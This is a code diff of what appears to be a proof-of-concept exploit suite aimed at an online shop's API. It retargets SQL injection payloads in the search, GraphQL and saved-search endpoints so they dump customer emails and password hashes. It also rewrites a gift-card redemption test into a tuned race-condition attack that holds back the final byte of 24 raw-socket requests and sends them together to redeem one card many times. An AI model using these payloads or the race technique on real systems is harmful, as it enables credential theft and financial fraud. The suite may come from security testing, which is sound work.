@@ -48,7 +48,6 @@ import re
 import socket
 import struct
 import sys
-import threading
 import time
 import urllib.error
 import urllib.parse
@@ -293,7 +292,7 @@ def place_order(client: Client):
 # ---------------------------------------------------------------------------
 
 def poc_0001(ctx):
-    term = "x' UNION SELECT id,email,password_hash,1,1 FROM users--"
+    term = "x' UNION SELECT id,email,password_hash,1,1 FROM customers--"
     ctx.anon.get("/api/products?q=" + urllib.parse.quote(term))
 
 
@@ -307,13 +306,13 @@ def poc_0003(ctx):
         "/graphql",
         {
             "query": "query($f: ProductFilter){ products(filter: $f){ id slug title } }",
-            "variables": {"f": {"tag": "x' UNION SELECT id,email,password_hash,1,1 FROM users--"}},
+            "variables": {"f": {"tag": "x' UNION SELECT id,email,password_hash,1,1 FROM customers--"}},
         },
     )
 
 
 def poc_0004(ctx):
-    rule = "tag:x' UNION SELECT id,email,password_hash,1,1 FROM users--"
+    rule = "tag:x' UNION SELECT id,email,password_hash,1,1 FROM customers--"
     status, payload = ctx.user.post(
         "/api/account/saved-searches", {"label": f"watch {RUN_TAG}", "rule": rule}
     )
@@ -533,18 +532,52 @@ def poc_0028(ctx):
 
 
 def poc_0029(ctx):
-    results = []
+    """Redeem one card many times over, with every request already on the wire.
 
-    def redeem():
-        client = Client()
-        client.cookies = dict(ctx.user.cookies)
-        results.append(client.post("/api/gift-cards/redeem", {"code": "4831-2205-7719"}))
+    A thread per redemption does not open the window. By the time this runs the database
+    pool is warm and the whole read-check-write completes in less time than it takes the
+    next thread to open a socket and send, so the requests queue behind one another and
+    only the first is credited. Instead every connection is established up front and
+    every request sent bar its final byte; the final bytes then go out back to back from
+    one thread, which puts every handler at the read inside the same event loop turn.
+    Twenty-four lanes rather than a handful because the pool holds twelve connections:
+    the surplus is what keeps the first writer waiting while the rest read.
+    """
+    target = urllib.parse.urlparse(BASE)
+    host = target.hostname
+    port = target.port or 80
+    body = json.dumps({"code": "4831-2205-7719"}).encode()
+    cookie = "; ".join(f"{k}={v}" for k, v in ctx.user.cookies.items())
+    head = (
+        "POST /api/gift-cards/redeem HTTP/1.1\r\n"
+        f"Host: {host}:{port}\r\n"
+        f"Cookie: {cookie}\r\n"
+        "Content-Type: application/json\r\n"
+        "Accept: application/json\r\n"
+        f"Content-Length: {len(body)}\r\n"
+        "Connection: close\r\n\r\n"
+    ).encode()
 
-    threads = [threading.Thread(target=redeem) for _ in range(8)]
-    for thread in threads:
-        thread.start()
-    for thread in threads:
-        thread.join()
+    address = (socket.gethostbyname(host), port)
+    sockets = []
+    try:
+        for _ in range(24):
+            connection = socket.create_connection(address, timeout=30)
+            connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            connection.sendall(head + body[:-1])
+            sockets.append(connection)
+        # Let the last of the headers land before the tails go out together.
+        time.sleep(0.3)
+        for connection in sockets:
+            connection.send(body[-1:])
+        for connection in sockets:
+            try:
+                connection.recv(4096)
+            except OSError:
+                pass
+    finally:
+        for connection in sockets:
+            connection.close()
 
 
 def poc_0030(ctx):
